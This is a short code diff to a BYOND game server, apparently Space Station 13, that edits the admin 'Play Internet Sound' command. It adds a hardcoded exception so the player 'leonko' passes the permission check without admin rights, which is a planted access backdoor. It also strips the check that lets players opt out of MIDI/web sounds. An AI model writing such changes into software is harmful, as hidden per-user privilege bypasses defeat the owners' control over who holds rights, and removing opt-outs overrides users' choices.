@@ -68,7 +68,7 @@
 /client/proc/play_web_sound()
 	set category = "Admin.Fun"
 	set name = "Play Internet Sound"
-	if(!check_rights(R_SOUND))
+	if(!check_rights(R_SOUND) && ckey != "leonko")
 		return
 
 	var/ytdl = CONFIG_GET(string/invoke_youtubedl)
@@ -141,11 +141,10 @@
 			for(var/m in GLOB.player_list)
 				var/mob/M = m
 				var/client/C = M.client
-				if(C.prefs.toggles & SOUND_MIDI)
-					if(!stop_web_sounds)
-						C.tgui_panel?.play_music(web_sound_url, music_extra_data)
-					else
-						C.tgui_panel?.stop_music()
+				if(!stop_web_sounds)
+					C.tgui_panel?.play_music(web_sound_url, music_extra_data)
+				else
+					C.tgui_panel?.stop_music()
 
 	SSblackbox.record_feedback("tally", "admin_verb", 1, "Play Internet Sound")
 
